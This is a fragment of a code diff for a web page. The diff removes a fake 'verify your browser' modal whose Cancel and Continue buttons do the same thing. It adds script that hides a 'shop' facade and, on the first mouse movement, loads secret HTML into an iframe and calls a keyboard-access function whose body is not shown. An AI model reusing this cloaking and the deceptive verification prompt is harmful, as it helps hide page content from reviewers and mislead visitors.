-        <div style="width:48px; height:48px; border:4px solid #e2e8f0; border-top:4px solid #2563eb; border-radius:50%; animation:spin-wheel 0.9s linear infinite;"></div>
-    </div>
-    
-    <style>
-        @keyframes spin-wheel {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
 
-    <div style="font-size:22px; font-weight:700; color:#111827; margin-bottom:8px; letter-spacing:-0.3px;">Checking Your Connection...</div>
-    <p style="font-size:14px; line-height:1.55; color:#6b7280; margin:0 0 24px 0;">We need to verify your browser before proceeding. Click Continue to proceed or Cancel to stop.</p>
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
-    <div style="display:flex; gap:12px;">
-        <button id="btn-cancel" onclick="dismissLoaderModal()" style="flex:1; background:#ffffff; color:#4b5563; border:1.5px solid #d1d5db; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer;">Cancel</button>
-        <button id="btn-continue" onclick="dismissLoaderModal()" style="flex:1; background:#2563eb; color:#ffffff; border:none; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer; box-shadow:0 4px 14px rgba(37,99,235,0.35);">Continue</button>
-    </div>
-</div>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
